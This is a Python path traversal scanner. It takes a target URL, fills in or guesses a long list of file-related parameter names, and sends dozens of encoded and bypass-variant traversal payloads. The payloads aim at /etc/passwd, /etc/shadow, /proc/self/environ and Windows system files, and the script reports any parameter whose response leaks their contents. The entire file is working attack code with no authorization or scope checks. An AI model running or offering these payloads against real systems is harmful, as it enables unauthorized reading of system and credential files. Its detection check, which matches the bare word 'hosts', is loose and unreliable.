import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore

def guess_params(params):
    if not params:
        common_params = [
    'file', 'path', 'document', 'folder', 'dir', 'root', 'template', 'page',
    'include', 'inc', 'view', 'show', 'load', 'module', 'content', 'filepath',
    'filename', 'doc', 'data', 'asset', 'img', 'image', 'photo', 'picture',
    'src', 'url', 'location', 'download', 'attachment', 'file_path', 'page_path',
    'folder_path', 'doc_path', 'resource', 'pagefile', 'contentfile', 'fileName',
    'documentName', 'folderName', 'templateName', 'incfile', 'fileurl', 'fileid',
    'filepath1', 'filepath2', 'file_path1', 'file_path2', 'docfile',
    'docfilepath', 'upload', 'uploadfile', 'upload_path', 'downloadfile', 'download_path',
    'fileToLoad', 'fileToInclude', 'inc_path', 'inc_file', 'pagefile_path', 'media',
    'mediafile', 'media_path', 'video', 'audio', 'text', 'txt', 'pdf', 'csv', 'xml',
    'json', 'script', 'style', 'css', 'js', 'config', 'settings', 'log', 'cache',
    'backup', 'bak', 'temp', 'tmp', 'userfile', 'user_path', 'adminfile', 'admin_path',
    'report', 'reportfile', 'export', 'import', 'attachmentfile', 'attachment_path',
    'img_path', 'imgfile', 'pic', 'picfile', 'img_url', 'filedata', 'fileinfo',
    'filepathinfo', 'pathinfo', 'filelocation', 'filelink', 'fileuri', 'doclink',
    'docurl', 'downloadurl', 'mediaurl', 'imageurl', 'video_url', 'audio_url',
    'fileuri', 'incpath', 'includefile', 'loadfile', 'loadpath', 'loadurl', 'loaduri',
    'resourcepath', 'resourcefile', 'assetpath', 'assetfile', 'tempfile', 'tmpfile',
    'userfilepath', 'userdoc', 'userfolder', 'userfolderpath', 'attachmenturl',
    'attachmentname', 'fileinput', 'fileoutput', 'filepathinput', 'filepathoutput',
    'pathinput', 'pathoutput', 'downloadpath', 'downloadfile', 'mediafileurl',
    'mediafilepath', 'scriptfile', 'scriptpath', 'stylefile', 'stylepath',
    'cssfile', 'csspath', 'jsfile', 'jspath', 'configfile', 'configpath', 'logfile',
    'logpath', 'backupfile', 'backuppath', 'tempfilepath', 'tmpfilepath', 'adminfileurl',
    'adminfilepath', 'reporturl', 'reportpath', 'exportfile', 'importfile', 'uploadfileurl',
    'uploadfilepath', 'tempfileurl', 'tmpfileurl', 'fileparam', 'fileparam1', 'fileparam2',
    'paramfile', 'parampath', 'filevar', 'pathvar', 'filefield', 'pathfield',
    'includeurl', 'includepath', 'includeparam', 'includevar', 'filecookie', 'pathcookie',
    'fileheader', 'pathheader', 'userfileurl', 'userfilepath', 'attachmentfilepath',
    'attachmentfileurl', 'downloadfilepath', 'downloadfileurl', 'imgfileurl',
    'imgfilepath', 'picfileurl', 'picfilepath', 'video_file', 'audio_file',
    'datafile', 'datapath', 'dataparam', 'paramdata', 'fileupload', 'filedownload',
    'fileuploadurl', 'filedownloadurl', 'fileuploadpath', 'filedownloadpath',
    'logfileurl', 'logfilepath', 'backupfileurl', 'backuppathurl', 'cachefile',
    'cachefilepath', 'tempfilepathurl', 'tmpfilepathurl', 'userfileparam',
    'userfilepathparam', 'adminfileparam', 'adminfilepathparam', 'reportfileurl',
    'reportfilepath', 'exportfilepath', 'importfilepath', 'attachmentfilepathurl',
    'attachmentfileurl', 'imgfilepathurl', 'picfilepathurl', 'scriptfilepath',
    'stylefilepath', 'cssfilepath', 'jspathfile', 'configfilepath', 'settingsfile',
    'settingsfilepath', 'logfilepathurl', 'backupfilepathurl', 'tempfilepathurl',
    'tmpfilepathurl', 'fileinclude', 'fileincludeurl', 'fileincludepath', 'loadfilepath',
    'loadfileurl', 'includefilepath', 'includefileurl', 'pathparam', 'fileparam3',
    'fileparam4', 'filepathparam1', 'filepathparam2', 'docfilepathurl', 'docfileurl',
    'downloadfileparam', 'mediafileparam', 'mediafilepathurl', 'imagefilepath',
    'video_filepath', 'audio_filepath', 'scriptfilepathurl', 'stylefilepathurl',
    'cssfilepathurl', 'jspathfilepath', 'configfilepathurl', 'settingsfilepathurl',
    'logfilepathurl', 'backupfilepathurl', 'tempfilepathurl', 'tmpfilepathurl',
    'uploadfilepathurl', 'uploadfileurlparam', 'downloadfilepathurl', 'downloadfileurlparam',
    'userfileurlparam', 'userfilepathurlparam', 'adminfileurlparam', 'adminfilepathurlparam',
    'reportfileurlparam', 'reportfilepathurlparam', 'exportfileurl', 'importfileurl',
    'attachmentfileurlparam', 'attachmentfilepathurlparam', 'imgfileurlparam',
    'imgfilepathurlparam', 'picfileurlparam', 'picfilepathurlparam'
]

        params = {p: [''] for p in common_params}
    return params

def run():
    print("Running Path Traversal scan with automatic parameter detection...")
    url = input("Enter target URL (with or without parameters): ").strip()
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params = guess_params(params)

    payloads = [
    "../../../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "../../boot.ini",
    "..\\..\\boot.ini",
    "../../../windows/system.ini",
    "../../../../../../../../../../../../etc/passwd",
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "../../../../../../../../../../../../boot.ini",
    "..\\..\\..\\..\\..\\..\\boot.ini",
    "../../../windows/system.ini",
    "../../../../../../../../../../../../../../../../etc/passwd",
    "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "../../../../../../../../../../../../../../../../boot.ini",
    "..\\..\\..\\..\\..\\..\\..\\..\\boot.ini",
    "../../../windows/system.ini",
    # URL encoded variants
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\windows\\win.ini",
    "..%2f..%2f..%2f..%2fboot.ini",
    "..%5c..%5cboot.ini",
    "..%2f..%2f..%2fwindows%2fsystem.ini",
    # Double URL encoded
    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd",
    "%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini",
    # UTF-8 encoded dots and slashes
    "%c0%af%c0%af%c0%afetc/passwd",
    "%c1%1c%c1%1cwindows/win.ini",
    # Null byte injection attempts (some servers truncate at %00)
    "../../../../../../etc/passwd%00",
    "..\\..\\..\\..\\windows\\win.ini%00",
    # Mixed slashes
    "..\\../..\\../etc/passwd",
    "../..\\../..\\windows\\win.ini",
    # Using different number of traversals
    "../../../../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    # Windows system folders
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:/Windows/System32/drivers/etc/hosts",
    # Linux common sensitive files
    "/etc/shadow",
    "/etc/hosts",
    "/proc/self/environ",
    # Unicode tricks
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "..%uff0e..%uff0e..%uff0eetc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
    "..%5c..%5c..%5c..%5c..%5c..%5cwindows\\win.ini",
    # More URL encoding variations
    "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    # Variants with spaces (sometimes bypass filters)
    ".. /.. /.. /etc/passwd",
    "..\\ ..\\ ..\\windows\\win.ini",
    # Repeated slashes
    "..//..//..//etc/passwd",
    "..\\\\..\\\\..\\\\windows\\\\win.ini",
    # Mixed URL and encoded
    "%2e%2e/%2e%2e\\%2e%2e/%2e%2e\\etc/passwd",
    # Bypass with double dots replacement
    "..%252f..%252f..%252fetc/passwd",
    # Adding trailing slash
    "../../../../../../etc/passwd/",
    # Adding query param
    "../../../../../../etc/passwd?foo=bar",
    # Adding trailing spaces
    "../../../../../../etc/passwd ",
    # Non-ASCII homoglyphs
    "..꞉..꞉..꞉etc/passwd",
    # Adding NULL chars in various ways
    "../../../../../../etc/passwd%00.png",
    # Long repetition
    "../../" * 30 + "etc/passwd",
    # And many more variations using combinations of above and permutations
]


    vulnerable_params = []

    for param in params:
        vulnerable = False
        for payload in payloads:
            test_params = params.copy()
            test_params[param] = payload
            test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
            try:
                res = requests.get(test_url, timeout=5)
                content = res.text.lower()
                if ("root:x" in content or 
                    "[extensions]" in content or 
                    "[fonts]" in content or 
                    "for 16-bit app support" in content or
                    "ntldr" in content or
                    "boot loader" in content or
                    "shadow:" in content or
                    "hosts" in content or
                    "proc/self/environ" in content):
                    print(Fore.RED + f"[!] Path Traversal vulnerability detected in parameter: {param} with payload: {payload}")
                    vulnerable = True
                    vulnerable_params.append(param)
                    break
            except Exception as e:
                print(Fore.RED + f"[ERROR] {e}")
        if not vulnerable:
            print(Fore.YELLOW + f"[ ] No Path Traversal detected in parameter: {param}")

    if not vulnerable_params:
        print(Fore.YELLOW + "[!] No vulnerable parameters detected for Path Traversal.")
